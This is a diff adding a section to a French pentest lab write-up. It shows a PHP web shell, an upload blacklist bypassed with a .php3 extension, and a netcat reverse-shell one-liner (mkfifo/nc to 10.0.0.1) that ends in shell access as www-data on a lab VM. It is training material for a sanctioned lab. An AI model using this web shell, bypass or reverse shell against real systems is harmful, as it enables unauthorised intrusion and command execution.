@@ -403,3 +403,73 @@ Une fois le mot de passe de l'administrateur obtenu. On peut retourner sur la pa
 
 ![Page d'admin : http://192.168.56.112/admin/](images/admin_page.png)
 
+On peut créer le fichier `shell.php` suivant, permettant une exécution de commande:
+```PHP
+<?php
+    system($_REQUEST['cmd']);
+?>
+```
+
+On va tenter d'uploader ce dernier sur le site.
+
+Les méthodes vues sur OWASP Bricks ne permettent 
+
+![](./images/fail_php_upload.png)
+
+Néanmoins, il est possible de contourner la liste noire en renommant le fichier en `.php3`.
+
+![On contourne le filtre avec l'extension `.php3`](./images/success_php_upload.png)
+
+__Note :__ il est églament possible d'uploader un fichier `.php5`, mais le serveur web ne permet pas son exécution.
+
+En parcourant le site et en regardant le code html des pages. On retrouve notre fichier dans le dossier `/admin/uploads`.
+
+[http://192.168.56.102/admin/uploads/shell.php3](http://192.168.56.102/admin/uploads/shell.php3)
+
+On peut exécuter des commandes à l'aide le paramètre `cmd` dans des requêtes `GET` ou `POST`.
+
+![Exécution de commande avec le fichier shell.php](./images/exec_commande.png)
+
+\newpage
+
+## Obtenir un reverse shell
+
+On va généralement chercher à obtenir un __accès interactif__ à une machine distante. Pas une simple exécution de commande.
+
+Le site _pentestmonkey.net_ possède une liste de commandes pour obtenir un _reverse shell_.\
+[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
+La commande suivante utilise des outils embarqués généralement par les distrubutions GNU/Linux, et est des plus fiable.
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```
+
+On peut simplement __ouvrir un port en écoute__ avec __`netcat`__ sur Kali.
+```bash
+nc -lvnp 9001
+```
+
+On adapte ensuite la commande à notre addresse IP et port. Puis on l'exécute (avec un encodage URL) via Burp et notre fichier `shell.php3` uploadé précédement.
+
+![Obtenir un reverse shell avec Burp](./images/rshell.png)
+
+La page web ne va pas répondre (PHP exécute un processus et rend pas la main). Et on obtient un shell interactif sur notre `netcat`.
+
+```bsh
+$ nc -lvnp 9001
+Listening on [0.0.0.0] (family 0, port 9001)
+Connection from 192.168.56.102 37079 received!
+/bin/sh: can't access tty; job control turned off
+$ id 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+$ ls
+cthulhu.png
+hacker.png
+ruby.jpg
+shell.php3
+shell.php5
+
+$ 
+```
